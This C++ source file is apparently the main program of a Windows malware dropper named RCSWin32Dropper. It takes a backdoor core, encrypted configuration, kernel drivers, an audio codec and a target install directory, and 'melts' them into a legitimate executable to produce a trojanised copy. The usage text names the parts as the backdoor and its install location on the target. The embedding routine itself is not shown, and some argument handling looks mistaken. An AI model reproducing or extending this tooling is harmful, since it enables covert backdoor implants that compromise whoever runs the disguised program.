// RCSDropper.cpp : Defines the entry point for the console application.
//

#pragma warning ( disable: 4996 )

#include <string>
#include <iostream>
using namespace std;

#include <time.h>

#include <xercesc/util/PlatformUtils.hpp>
#include <xercesc/util/XMLString.hpp>

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "common.h"
#include "dropper.h"

#include "Manifest.h"
#include "MeltFile.h"

int main(int argc, char* argv[])
{
	BOOL ret = FALSE;
	MelterStruct MS;

	srand( (unsigned int) time(NULL) );
	
	memset(&MS, 0, sizeof(MelterStruct));
	MS.manifest = false;
	
	if (argc != 11) {
		printf("ERROR: \n");
		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <input> <output>\n\n");
		printf("  <core> is the backdoor core\n");
		printf("  <core64> is the 64 bit backdoor core\n");
		printf("  <conf> is the backdoor encrypted configuration\n");
		printf("  <driver> is the kernel driver\n");
		printf("  <driver64> is the 64 bit kernel driver\n");
		printf("  <codec> is the audio codec\n");
		printf("  <instdir> is the backdoor install directory (on the target)\n");
		printf("  <manifest> is a boolean flag for modifying the manifest\n");
		printf("  <input> is the exe to be melted\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}
	
	/************************************************************************/
	/* PREPARING PARAMETERS                                                 */
	/************************************************************************/
	
	for (int i = 0; i < argc; i++)
		printf("%s\n", argv[i]);
	
	sprintf(MS.core, "%s", argv[1]);
	sprintf(MS.conf, "%s", argv[3]);
	
	if (strcmp(argv[2], "null")) {
		sprintf(MS.core64, "%s", argv[2]);
	}
	
	if (strcmp(argv[4], "null")) {
		sprintf(MS.driver, "%s", argv[3]);
	}

	if (strcmp(argv[5], "null")) {
		sprintf(MS.driver64, "%s", argv[5]);
	}

	if (strcmp(argv[6], "null")) {
		sprintf(MS.codec, "%s", argv[4]);
	}
	printf("Instdir = %s\n", argv[7]);
	sprintf(MS.instdir, "%s", argv[7]);

	if (!strcmp(argv[8], "1") )
		MS.manifest = true;
	
	bf::path coreFile = MS.core;
	bf::path core64File = MS.core64;
	bf::path configFile = MS.conf;
	bf::path driverFile = MS.driver;
	bf::path driver64File = MS.driver64;
	bf::path codecFile = MS.codec;
	bf::path exeFile = argv[9];
	bf::path outputFile = argv[10];
	
	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	
	if ( !bf::exists(exeFile) ) {
		cout << "Cannot find the input exe file [" << exeFile << "]" << endl;
		return ERROR_EMBEDDING;
	}
	
	if ( !bf::exists(coreFile) ) {
		cout << "Cannot find the core file [" << coreFile << "]" << endl;
		return ERROR_EMBEDDING;
	}
	
	if ( !bf::exists(configFile) ) {
		cout << "Cannot find the config file [" << configFile << "]" << endl;
		return ERROR_EMBEDDING;
	}

	if (MS.core64[0]) {
		if ( !bf::exists(core64File) ) {
			cout << "Cannot find the driver file [" << core64File << "]" << endl;
			return ERROR_EMBEDDING;
		}
	}

	if (MS.driver[0]) {
		if ( !bf::exists(driverFile) ) {
			cout << "Cannot find the driver file [" << driverFile << "]" << endl;
			return ERROR_EMBEDDING;
		}
	}

	if (MS.driver64[0]) {
		if ( !bf::exists(driver64File) ) {
			cout << "Cannot find the driver file [" << driver64File << "]" << endl;
			return ERROR_EMBEDDING;
		}
	}
	
	if (MS.codec[0]) {
		if ( !bf::exists(codecFile) ) {
			cout << "Cannot find the codec file [" << codecFile << "]" << endl;
			return ERROR_EMBEDDING;
		}
	}
	
	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/
	
	printf("Ready to go...\n");
	printf("CORE (32 bit)   [%s]\n", MS.core);
	printf("CORE (64 bit)   [%s]\n", (MS.core64) ? MS.core64 : "none");
	printf("CONFIGURATION   [%s]\n", MS.conf);
	printf("INSTALL DIR     [%s]\n", MS.instdir);
	printf("DRIVER (32 bit) [%s]\n", (MS.driver) ? MS.driver : "none");
	printf("DRIVER (64 bit) [%s]\n", (MS.driver64) ? MS.driver64 : "none");
	printf("CODEC           [%s]\n", (MS.codec) ? MS.codec : "none");
	printf("MANIFEST        [%d]\n", MS.manifest);
	cout << "INPUT          [" << exeFile << "]" << endl;
	cout << "OUTPUT         [" << outputFile << "]" << endl << endl;
	
	if ( bf::exists(outputFile) )
		bf::remove(outputFile);
	
	bf::copy_file(exeFile, outputFile);
	if ( !bf::exists(outputFile) ) {
		cout << "Cannot create output file [" << outputFile << "]" << endl;
		return ERROR_OUTPUT;
	}
	
	/************************************************************************/
	/* DROPPER                                                              */
	/************************************************************************/
	
	if (!Manifest::initialize())
		return ERROR_OUTPUT;
	
	try {
		int ret = MeltFile(
		exeFile.string().c_str(),
		outputFile.string().c_str(),
		&MS
		);
	} catch (melting_error &e) {
		cout << e.what() << endl;
		bf::remove(outputFile);
		return ERROR_OUTPUT;
	}catch (...) {
		cout << "UNEXPECTED EXCEPTION!" << endl;
		bf::remove(outputFile);
		return ERROR_OUTPUT;
	}
	
	cout << "Output file melted... ok" << endl;
	
	return 0;
}
